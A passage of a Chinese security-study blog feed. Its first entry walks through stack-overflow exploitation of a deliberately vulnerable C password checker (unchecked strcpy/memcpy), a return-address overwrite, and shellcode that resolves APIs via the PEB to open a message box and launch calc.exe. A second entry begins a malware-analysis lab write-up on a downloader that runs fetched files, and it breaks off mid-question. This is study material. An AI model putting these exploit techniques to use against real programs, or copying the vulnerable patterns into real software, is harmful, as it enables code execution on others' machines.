class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>只有输入正确的密码才会提示right</p><p><img src="/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/3.png"></p><p>从上述例子可以看到，我们需要输入密码，然后会调用a函数来进行比较，这是一个人为构造的栈溢出漏洞。</p><p>使用OD打开此程序进行调试查看，输入<code>7654321</code>当执行完<code>strcpy</code>函数之后，可以看到此时<code>ebp-4</code>存放的是<code>strcmp</code>的返回值，而上面就是buffer数组了。可以看到此时如果buffer数组的长度再长一些，就会成功覆盖到返回值。根据<code>    strcpy</code>函数返回值，我们只需要将保存<code>iRet</code>的地方覆盖为0即可。</p><p><img src="/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/2.png"></p><p>现在尝试输入<code>123456789</code>查看栈内情况，可以看到9已经覆盖了原来的值1。</p><p><img src="/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/4.png"></p><p>对于<code>123456789</code>这样一个字符串来说还存在隐藏的第十个字符，截断符<code>NULL</code>也占一个位，也就是如果我们想要成功覆盖返回值，只需要构造一个长度为8的字符串即可。但是必须要大于1234567，因为strcmp返回值如果是小于的话，返回值是-1，也就是FFFFFFFF，这样的话，是没有办法构造字符串成功覆盖的。</p><p>输入八个a，查看结果，可以看到本来应该是1的，现在是0。</p><p><img src="/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/5.png"></p><p>利用栈溢出，成功绕过验证</p><p><img src="/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/6.png"></p><h3 id="修改函数返回地址"><a href="#修改函数返回地址" class="headerlink" title="修改函数返回地址"></a>修改函数返回地址</h3><p>前面修改了返回值，而在返回值下面不远处就是返回地址，如果我们可以修改返回地址就会造成更大的伤害。</p><p>尝试构造更加长的字符串，输入两串1-9，可以看到此时返回地址处已经被成功覆盖了。</p><p><img src="/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/7.png"></p><p>现在只要想办法覆盖到返回地址，让那里的值刚好是另一个地址的值，那么在执行<code>retn</code>的时候就会跳到另一个地址去执行指令。我们现在想办法，让其返回的时候直接返回到成功的地方，就可以了。调试一下，可以看到当前输出正确的地址是<code>0x401106</code>，在返回值处填入此值，就会直接返回到正确处。</p><p><img src="/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/8.png"></p><p><img src="/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/9.png"></p><h3 id="控制程序的执行流程"><a href="#控制程序的执行流程" class="headerlink" title="控制程序的执行流程"></a>控制程序的执行流程</h3><p>一些十六进制值无法用键盘输入，所以将代码进行修改，使其读取文件内容来进行比较。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;stdafx.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PASSWORD <span class="hljs-meta-string">&quot;1234567&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">a</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *password)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> iRet;<br><span class="hljs-keyword">char</span> buffer[<span class="hljs-number">8</span>];<br>iRet = <span class="hljs-built_in">strcmp</span>(password,PASSWORD);<br><span class="hljs-built_in">strcpy</span>(buffer,password);<br><span class="hljs-keyword">return</span> iRet;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> iFlag=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">char</span> password[<span class="hljs-number">1024</span>];<br>FILE * fp;<br><span class="hljs-keyword">if</span>(!(fp=fopen(<span class="hljs-string">&quot;1.txt&quot;</span>,<span class="hljs-string">&quot;rw+&quot;</span>)))<br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-built_in">fscanf</span>(fp,<span class="hljs-string">&quot;%s&quot;</span>,password);<br>iFlag = a(password);<br><span class="hljs-keyword">if</span>(iFlag)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;wrong\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;right\n&quot;</span>);<br>&#125;<br>fclose(fp);<br>getchar();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>在1.txt内写入如下内容，前两组<code>1234</code>是buffer数组，第三组覆盖iRet，第四组覆盖返回值上面的栈空间，第五组<code>40111F</code>就是输出right的地方，直接让其返回到这里，这样一直都会是正确。</p><p><img src="/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/10.png"></p><p>打开程序就会直接提示正确，但是程序也提示了遇到了一些问题，这是因为栈空间被修改，退出时无法保持栈平衡，奔溃了。</p><p><img src="/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/11.png"></p><h3 id="代码植入"><a href="#代码植入" class="headerlink" title="代码植入"></a>代码植入</h3><p>前面已经介绍了如何覆盖返回地址，前面是返回到程序自身的地址，如果我们构造自己的代码，然后让程序返回到我们自己写的代码处，就可以实现我们想要的功能。修改下之前写的代码，主要修改的地方是buffer的长度，还有<code>fscanf</code>修改为了<code>fread</code>，<code>strcpy</code>修改为了<code>memcpy</code>，主要是之前的函数遇到0就截止了，所以用这两个函数好了。加入LoadLibrary(“user32.dll”)，是为了后面shellcode中调用messagebox。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;stdafx.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PASSWORD <span class="hljs-meta-string">&quot;1234567&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">a</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *password)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> iRet;<br><span class="hljs-keyword">char</span> buffer[<span class="hljs-number">44</span>];<br>iRet = <span class="hljs-built_in">strcmp</span>(password,PASSWORD);<br><span class="hljs-built_in">memcpy</span>(buffer,password,<span class="hljs-number">100</span>);<br><span class="hljs-keyword">return</span> iRet;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> iFlag=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">char</span> password[<span class="hljs-number">1024</span>];<br>FILE * fp;<br>LoadLibrary(<span class="hljs-string">&quot;user32.dll&quot;</span>);<br><span class="hljs-keyword">if</span>(!(fp=fopen(<span class="hljs-string">&quot;1.txt&quot;</span>,<span class="hljs-string">&quot;rw+&quot;</span>)))<br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>fread(password,<span class="hljs-number">1024</span>,<span class="hljs-number">1</span>,fp);<br>iFlag = a(password);<br><span class="hljs-keyword">if</span>(iFlag)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;wrong\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;right\n&quot;</span>);<br>&#125;<br>fclose(fp);<br>getchar();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>我们实现一个弹窗的效果，调用<code>MessageBoxA</code></p><p>先来看一下shellcode，这是我的shellcode，书上是通过buffer的大小来保证足够的栈空间执行代码，我没有用书上的方法，我的buffer中存放就是刚好我的shellcode，我是用代码来开辟栈空间。</p><blockquote><p>sub esp,0x100</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br>__declspec(naked) <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">MAIN</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>__asm<br>&#123;<br>sub esp,<span class="hljs-number">0x100</span><span class="hljs-comment">//开辟栈空间</span><br>push <span class="hljs-number">0</span><br>push <span class="hljs-string">&#x27;eik&#x27;</span><br>push <span class="hljs-string">&#x27;ca1b&#x27;</span><br>mov eax ,esp<br>push <span class="hljs-number">0</span><br>push <span class="hljs-string">&#x27;tset&#x27;</span><br>mov ebx,esp<br>push <span class="hljs-number">0</span><br>push ebx<br>push eax<br>push <span class="hljs-number">0</span><br>mov eax,<span class="hljs-number">0x77D507EA</span><span class="hljs-comment">//MeeageBoxA的地址</span><br>call eax<br>&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>首先先通过调试来确定这段代码的开头在哪里，可以看到是<code>12FAEC</code>，这个时候可以构建txt了。</p><p><img src="/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/12.png"></p><p>还有就是代码中的MeeageBoxA的地址，可以通过工具<code>Dependency Walker</code>来确定，在当前使用的操作系统中，我的是XP，拖入一个调用了user32.dll的程序，也可以直接把user32.dll拿出来分析。</p><p>如图可以看到user32.dll的基地址是<code>77D10000</code>，而<code>MessageBoxA</code>在其中的偏移是<code>407EA</code>，相加就是<code>77D507EA</code>，这就是<code>MessageBoxA</code>的地址。</p><p><img src="/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/16.png"></p><p>将shellcode写入，并且将执行shellcode的起始位置写入末尾，来覆盖返回地址。</p><p><img src="/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/13.png"></p><p>执行<code>retn</code>之后，可以看到成功来到了shellcode处。</p><p><img src="/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/14.png"></p><p>实现了弹窗</p><p><img src="/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/15.png"></p><p>也可以在shellcode中实现所有的函数动态加载</p><p>在这里，写了一些shellcode的东西<a href="https://b1ackie.cn/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/">shellcode学习</a></p><p>根据这些可以写一个弹计算器的，来进行实现。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-function">DWORD <span class="hljs-title">getKernel32</span><span class="hljs-params">()</span></span>;<br>FARPROC _GetProcAddress(HMODULE hModule);<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">UINT</span> <span class="hljs-params">(WINAPI* FN_WinExec)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ LPCSTR lpCmdLine,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ UINT uCmdShow)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">MAIN</span><span class="hljs-params">()</span> </span>&#123;<br>__asm &#123;<br>sub esp,<span class="hljs-number">0x1000</span><br>&#125;<br>HMODULE hAddr = (HMODULE)getKernel32();<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">FARPROC</span><span class="hljs-params">(WINAPI* FN_GetProcAddress)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ LPCSTR lpProcName</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br>FN_GetProcAddress fn_GetProcAddress;<br>fn_GetProcAddress = (FN_GetProcAddress)_GetProcAddress(hAddr);<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">HMODULE</span><span class="hljs-params">(WINAPI* FN_LoadLibraryA)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ LPCSTR lpLibFileName)</span></span>;<br><span class="hljs-keyword">char</span> szLoadLibraryA[] = &#123; <span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-number">0</span> &#125;;<br>FN_LoadLibraryA fn_LoadLibraryA = (FN_LoadLibraryA)fn_GetProcAddress(hAddr, szLoadLibraryA);<br><span class="hljs-keyword">char</span> szWinexec[] = &#123; <span class="hljs-string">&#x27;W&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span> ,<span class="hljs-string">&#x27;E&#x27;</span> ,<span class="hljs-string">&#x27;x&#x27;</span> ,<span class="hljs-string">&#x27;e&#x27;</span> ,<span class="hljs-string">&#x27;c&#x27;</span> ,<span class="hljs-number">0</span> &#125;;<br>FN_WinExec my_WinExec = (FN_WinExec)fn_GetProcAddress(hAddr, szWinexec);<br><span class="hljs-keyword">char</span> szCalc[] = &#123; <span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span> ,<span class="hljs-string">&#x27;l&#x27;</span> ,<span class="hljs-string">&#x27;c&#x27;</span> ,<span class="hljs-string">&#x27;.&#x27;</span> ,<span class="hljs-string">&#x27;e&#x27;</span> ,<span class="hljs-string">&#x27;x&#x27;</span> ,<span class="hljs-string">&#x27;e&#x27;</span> ,<span class="hljs-number">0</span> &#125;;<br>my_WinExec(szCalc, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>_declspec(naked) <span class="hljs-function">DWORD <span class="hljs-title">getKernel32</span><span class="hljs-params">()</span> </span>&#123;<br>__asm &#123;<br>mov eax, fs: [<span class="hljs-number">30</span>h]<span class="hljs-comment">//获取PEB</span><br>mov eax, [eax + <span class="hljs-number">0</span>Ch]<span class="hljs-comment">//获取_PEB_LDR_DATA</span><br>mov eax, [eax + <span class="hljs-number">14</span>h]<span class="hljs-comment">//InMemoryOrderModuleList，</span><br>mov eax, [eax]<span class="hljs-comment">//程序自身</span><br>mov eax, [eax]<span class="hljs-comment">//ntdll.dll</span><br>mov eax, [eax + <span class="hljs-number">10</span>h]<span class="hljs-comment">//kernel.dll,偏移10H是地址</span><br>ret<br>&#125;<br>&#125;<br><br>FARPROC _GetProcAddress(HMODULE hModule) &#123;<br>PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;<br>PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);<br>PIMAGE_EXPORT_DIRECTORY lpExport = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pDosHeader +<br>(DWORD)pNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);<br>PDWORD lpAddressOfNamesArray = (PDWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfNames);<br>PWORD lpAddressOfNameOrdinalArray = (PWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfNameOrdinals);<br>PDWORD lpAddressOfFuncArray = (PDWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfFunctions);<br>DWORD dwNumber = lpExport-&gt;NumberOfNames;<br>DWORD wHint = <span class="hljs-number">0</span>;<br>FARPROC lpFunc;<br><span class="hljs-keyword">for</span> (DWORD i = <span class="hljs-number">0</span>; i &lt; dwNumber; i++) &#123;<br><span class="hljs-keyword">char</span>* lpFuncName = (<span class="hljs-keyword">char</span>*)((DWORD)pDosHeader + lpAddressOfNamesArray[i]);<br><span class="hljs-keyword">if</span> (lpFuncName[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;G&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;e&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;t&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;P&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">4</span>] == <span class="hljs-string">&#x27;r&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">5</span>] == <span class="hljs-string">&#x27;o&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">6</span>] == <span class="hljs-string">&#x27;c&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">7</span>] == <span class="hljs-string">&#x27;A&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">8</span>] == <span class="hljs-string">&#x27;d&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">9</span>] == <span class="hljs-string">&#x27;d&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">10</span>] == <span class="hljs-string">&#x27;r&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">11</span>] == <span class="hljs-string">&#x27;e&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">12</span>] == <span class="hljs-string">&#x27;s&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">13</span>] == <span class="hljs-string">&#x27;s&#x27;</span>) &#123;<br>wHint = lpAddressOfNameOrdinalArray[i];<br>lpFunc = (FARPROC)((DWORD)pDosHeader + lpAddressOfFuncArray[wHint]);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> lpFunc;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>实现效果</p><p><img src="/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/1.gif"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本篇主要是学习了栈溢出的原理，及其中的一些利用，难度不是很高。不过我在做的过程中，还是遇到了一些问题，漏洞利用一定要动手去调试，不能光靠看就得出其中的一些结论。还有一定要注意栈的空间，执行shellcode时候是否有足够的空间，不然压栈是会覆盖原始代码的。</p>]]></content>
    
    
    <categories>
      
      <category>0day安全：软件漏洞分析技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>读书笔记</tag>
      
      <tag>漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>恶意代码分析实战-实验14</title>
    <link href="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/"/>
    <url>/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/</url>
    
    <content type="html"><![CDATA[<h2 id="Lab-14-1"><a href="#Lab-14-1" class="headerlink" title="Lab 14-1"></a>Lab 14-1</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>使用IDA打开程序，首先会获取当前计算机的GUID，然后将后12位给拼接成XX:XX:XX:XX:XX:XX的形式。再获取用户名，再将用户名与刚才的字符串拼接。</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/1-1.png"></p><p>拼接后的字符串</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/1-2.png"></p><p>然后会将此字符串进行base64编码，，分析可知<code>sub_4010BB</code>是一个base64编码的函数，且此base64进行了魔改，用于补位的不是“=”而是字符“a”。</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/1-3.png"></p><p>然后会进入<code>sub_4011A3</code>函数，此函数中包含网络行为。会尝试访问一个URL，并且通过<code>URLDownloadToCacheFileA</code>下载资源，此URL的形成是字符串和域名拼接起来，%c.png则是字符串的最后一位，如果最后一位是a，就是a.png，然后保存在<code>ApplicationName</code>，如果下载成功的话，会使用<code>CreateProcessA</code>启动下载的程序。</p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/1-4.png"></p><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><h4 id="1-恶意代码使用了哪些网络库？它们的优势是什么？"><a href="#1-恶意代码使用了哪些网络库？它们的优势是什么？" class="headerlink" title="1.恶意代码使用了哪些网络库？它们的优势是什么？"></a>1.恶意代码使用了哪些网络库？它们的优势是什么？</h4><p>恶意代码使用了<code>urlmon.dll</code>中的<code>URLDownloadToCacheFileA</code></p><p><img src="/2021/10/13/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C14/1-5.png"></p><h4 id="2-用于构建网络信令的信息源元素是什么，什么样的条件会引起信令的改变？"><a href="#2-用于构建网络信令的信息源元素是什么，什么样的条件会引起信令的改变？" class="headerlink" title="2.用于构建网络信令的信息源元素是什么，什么样的条件会引起信令的改变？"></a>2.用于构建网络信令的信息源元素是什么，什么样的条件会引起信令的改变？</h4><p>根据前面的分析，信息源元素是计算机的<code>GUID</code>和当前的用户名，如果换了计算机或者用户发生改变，会引起信令的改变。</p><h4 id="3-为什么攻击者可能对嵌入在网络信令中的信息感兴趣？"><a href="#3-为什么攻击者可能对嵌入在网络信令中的信息感兴趣？" class="headerlink" title="3.为什么攻击者可能对嵌入在网络信令中的信息感兴趣？"></a>3.为什么攻击者可能对嵌入在网络信令中的信息感兴趣？</h4><p>因为这其中包含着计算器的<code>GUID</code>和当前的用户名。</p><h4 id="4-恶意代码是否使用了标准的base64编码？如果不是，编码是如何不寻常的？"><a href="#4-恶意代码是否使用了标准的base64编码？如果不是，编码是如何不寻常的？" class="headerlink" title="4.恶意代码是否使用了标准的base64编码？如果不是，编码是如何不寻常的？"></a>4.恶意代码是否使用了标准的base64编码？如果不是，编码是如何不寻常的？</h4><p>没有使用标准的base64编码，用于补位的字符不是“=”，而是“a”。</p><h4 id="5-恶意代码的主要目的是什么？"><a href="#5-恶意代码的主要目的是什么？" class="headerlink" title="5.恶意代码的主要目的是什么？"></a>5.恶意代码的主要目的是什么？</h4><p>下载一个文件并且执行它</p><h4 id="6-使用网络特征可能有效探测到恶意代码通信中的什么元素？"><a href="#6-使用网络特征可能有效探测到恶意代码通信中的什么元素？" class="headerlink" 